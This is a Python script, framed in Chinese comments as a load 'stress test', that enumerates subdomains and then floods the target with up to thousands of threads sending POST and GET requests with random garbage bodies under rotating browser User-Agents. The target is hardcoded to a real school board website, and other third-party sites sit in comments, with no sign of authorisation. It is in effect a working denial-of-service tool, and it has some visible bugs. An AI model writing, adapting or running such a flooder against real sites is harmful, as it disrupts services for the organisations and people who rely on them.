import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
import time
import random
import threading
import numpy as np
import matplotlib.pyplot as plt
from datetime import datetime
import psutil
import logging
from tqdm import tqdm
import sublist3r
import httpx
import string

# 记录已访问的URL集合
visited_urls = set()
# 最大递归深度
max_depth = 10

# 请求头列表
headers_list = [
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:84.0) Gecko/20100101 Firefox/84.0"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:92.0) Gecko/20100101 Firefox/92.0"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:93.0) Gecko/20100101 Firefox/93.0"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0"}
]

# 初始化日志记录
logging.basicConfig(filename='request_logs.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')


def get_subdomains(domain):
    # 使用 Sublist3r 获取子域名
    subdomains = sublist3r.main(domain, 40, savefile=None, ports=None, silent=True, verbose=False, enable_bruteforce=False, engines=None)
    return subdomains


def get_all_urls(base_url):
    """获取给定网址下的所有链接"""
    urls = set()
    try:
        response = requests.get(base_url, verify=False)
        soup = BeautifulSoup(response.text, 'html.parser')
        for link in soup.find_all('a', href=True):
            href = link['href']
            full_url = urljoin(base_url, href)
            urls.add(full_url)
    except Exception as e:
        print(f"Error fetching URLs from {base_url}: {e}")
    return urls


def dynamic_thread_management():
    """动态调整线程数以避免系统资源耗尽"""
    cpu_usage = psutil.cpu_percent(interval=1)
    if cpu_usage > 80:
        return max(10, thread_count // 2)
    elif cpu_usage < 50:
        return min(2500, thread_count * 2)
    return thread_count

def log_request_details(result):
    """记录每次请求的详细信息"""
    logging.info(f"URL: {result['url']}, Status: {result['status_code']}, "
                 f"Response Time: {result['response_time']:.2f}s, Data Size: {result['data_size']} bytes")

def net_speed():
    """返回当前网络上传和下载速度"""
    sent_before = psutil.net_io_counters().bytes_sent
    recv_before = psutil.net_io_counters().bytes_recv
    time.sleep(1)
    sent_now = psutil.net_io_counters().bytes_sent
    recv_now = psutil.net_io_counters().bytes_recv
    sent = (sent_now - sent_before) / 1024
    recv = (recv_now - recv_before) / 1024
    return sent, recv

    
def update_progress():
    """使用 tqdm 显示测试进度"""
    global active_threads, requests_last_second
    start_time = time.time()
    with tqdm(total=test_duration, bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} [{rate_fmt}]') as pbar:
        while threads_running:
            elapsed_time = time.time() - start_time
            progress = elapsed_time / test_duration
            pbar.n = int(progress * test_duration)
            pbar.set_postfix({
                'Active Threads': active_threads,
                'Requests/s': requests_last_second,
                'Upload': f"{net_speed()[0]:.2f}KB/s",
                'Download': f"{net_speed()[1]:.2f}KB/s"
            })
            pbar.update(0)
            time.sleep(1)
            requests_last_second = 0  # Reset after each second

def getNet():
    """显示当前网络流量"""
    sent_before = psutil.net_io_counters().bytes_sent
    recv_before = psutil.net_io_counters().bytes_recv
    time.sleep(1)
    sent_now = psutil.net_io_counters().bytes_sent
    recv_now = psutil.net_io_counters().bytes_recv
    sent = (sent_now - sent_before) / 1024
    recv = (recv_now - recv_before) / 1024
    print(f"上传：{sent:.2f}KB/s, 下载：{recv:.2f}KB/s", end='\r')

def dashboard():
    """显示系统和测试的实时状态"""
    global active_threads, requests_last_second
    while threads_running or active_threads > 0:
        with lock:
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f'\n{now} [Dashboard] Active Threads: {active_threads}, '
                  f'Requests Last Second: {requests_last_second}\n', end='\r')
            getNet()
            requests_last_second = 0
        time.sleep(1)

# 生成随机的可显示字符
def generate_garbled_text(length):
    # 包含所有可显示的字符
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for _ in range(length))

        
def perform_requests():
    """执行压力测试请求"""
    global active_threads, requests_last_second
    with lock:
        active_threads += 1
    try:
        while threads_running:
            random.seed(time.time())
            url = random.choice(urls)
            headers = random.choice(headers_list)
            start_time = datetime.now()
            
            # 重试逻辑
            max_retries = 5
            for attempt in range(max_retries):
                try:
                    # 生成乱码数据
                    garbled_text = generate_garbled_text(160)
                    response = requests.post(url, headers=headers, data=garbled_text, verify=False)
                    response = requests.get(url, headers=headers, data=garbled_text, verify=False)
                    break  # 成功时跳出重试循环
                except requests.exceptions.RequestException as e:
                    logging.error(f"请求错误: {e}, 正在重试...")
                    time.sleep(1)
                    if attempt == max_retries - 1:  # 如果到达最大重试次数
                        logging.error(f"最大重试次数已到达，放弃请求：{url}")
                        return  # 放弃请求，不再继续循环
                except Exception as e:
                    logging.error(f"未知错误: {e}")
                    print(f"请求发生未知错误: {e}")
                    time.sleep(1)

            # 请求完成，记录时间和数据大小
            end_time = datetime.now()
            elapsed_time = (end_time - start_time).total_seconds()
            data_size = len(response.content)
                
            with lock:
                result = {
                    "timestamp": start_time,
                    "url": url,
                    "response_time": elapsed_time,
                    "status_code": response.status_code,
                    "success": response.status_code == 200,
                    "data_size": data_size
                }
                results.append(result)
                requests_last_second += 1
                log_request_details(result)

            time.sleep(request_interval)
            
    except Exception as e:
        logging.error(f"线程执行错误: {e}")
        print(f"线程执行错误: {e}")
    finally:
        with lock:
            active_threads -= 1

def analyze_results():
    url_stats = {url: {"times_requested": 0, "response_times": [], "data_sizes": [], "failures": 0} for url in urls}
    for result in results:
        stats = url_stats[result["url"]]
        stats["times_requested"] += 1
        stats["response_times"].append(result["response_time"])
        stats["data_sizes"].append(result["data_size"])
        if not result["success"]:
            stats["failures"] += 1

    print("\nDetailed URL Statistics:")
    for url, stats in url_stats.items():
        avg_response_time = np.mean(stats["response_times"]) if stats["response_times"] else 0
        avg_data_size = np.mean(stats["data_sizes"]) if stats["data_sizes"] else 0
        if stats['times_requested'] != 0:
            print(f"URL: {url}, Requests: {stats['times_requested']}, Avg Response Time: {avg_response_time:.2f}s, "
                  f"Avg Data Size: {avg_data_size:.2f} bytes, Failures: {stats['failures']}, Failures Rate: {(stats['failures']/stats['times_requested'])*100:.2f}%")
        else:
            print(f"URL: {url}, Requests: {stats['times_requested']}, Avg Response Time: {avg_response_time:.2f}s, "
                  f"Avg Data Size: {avg_data_size:.2f} bytes, Failures: {stats['failures']}, Failures Rate: /%")

    url_count = len(urls)
    plt.figure(figsize=(min(max(url_count, 10), 50), 8), dpi=800)

    plt.subplot(1, 3, 1)
    plt.bar(range(url_count), [stats['failures'] for stats in url_stats.values()], tick_label=list(url_stats.keys()))
    plt.xticks(rotation=45, ha="right", fontsize=8)
    plt.ylabel('Failures')
    plt.title('Failures by URL')

    plt.subplot(1, 3, 2)
    plt.bar(range(url_count), [np.mean(stats['data_sizes']) for stats in url_stats.values()], tick_label=list(url_stats.keys()))
    plt.xticks(rotation=45, ha="right", fontsize=8)
    plt.ylabel('Average Data Size (bytes)')
    plt.title('Average Data Size by URL')

    plt.subplot(1, 3, 3)
    plt.bar(range(url_count), [np.mean(stats['response_times']) for stats in url_stats.values()], tick_label=list(url_stats.keys()))
    plt.xticks(rotation=45, ha="right", fontsize=8)
    plt.ylabel('Average Response Time (s)')
    plt.title('Average Response Time by URL')

    now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    plt.savefig(f"{now}.jpg")
    
    plt.tight_layout()
    plt.show()

# 配置测试参数
thread_count = 1000
test_duration = 2400 # 测试持续时间（秒）
request_interval = 0.1  # 每个请求之间的间隔（秒）
progress_update_interval = 5  # 进度更新间隔（秒）

# 共享资源
threads_running = True
lock = threading.Lock()
results = []
requests_last_second = 0  # 上一秒请求次数
active_threads = 0
start_time = datetime.now()

# 获取网站所有链接
# url = "https://bosseconbizchamps.org"
# domain = 'www2.yrdsb.ca'
# domain = 'lorvale.ca'
# url = 'https://www.tcdsb.org'
# url = 'https://google.com'
domain = 'flightbear.org'
# domain = 'stevenchen.site'
# urls = get_all_website_links(url)
# urls = [url for url in urls if url.startswith("http")]
# urls = list(all_urls)
all_urls = set()

# 需要手动指定子域名
print(f"Fetching subdomains for {domain}...")
subdomains = get_subdomains(domain)
domains = []
domains.append("https://"+domain)
all_urls.update("https://"+domain)
for i in subdomains:
    domains.append("https://"+i)
    all_urls.update("https://"+i)

print(domains)

for domain in tqdm(domains):
    print(f"Scanning domain: {domain}")
    urls = get_all_urls(domain)
    all_urls.update(urls)

urls = list(all_urls)
for i in urls:
    if i.split('.')[-2:-1] != domain.split('.')[-2:-1]:
        urls.remove(i)
        
urls = ['https://www2.yrdsb.ca']
# urls = ['https://flightbear.org']

print(f"\nTotal valid URLs found: {len(urls)}")
# if len(urls) < 20:
print(f"URLs: {urls}")
# else:
#     print("URLs are too long to display.")
    
# 启动进度条和Dashboard线程
progress_thread = threading.Thread(target=update_progress, args=(start_time,))
dashboard_thread = threading.Thread(target=dashboard)
progress_thread.start()
dashboard_thread.start()

# 启动压力测试线程
thread_count = dynamic_thread_management()
threads = []
for _ in range(thread_count):
    t = threading.Thread(target=perform_requests)
    t.start()
    threads.append(t)

# 等待测试完成
time.sleep(test_duration)
threads_running = False

# 等待所有线程结束
for t in threads:
    t.join()

# 分析并可视化结果
analyze_results()

# 停止进度条和 Dashboard线程
progress_thread.join()
dashboard_thread.join()

print("测试完成！")
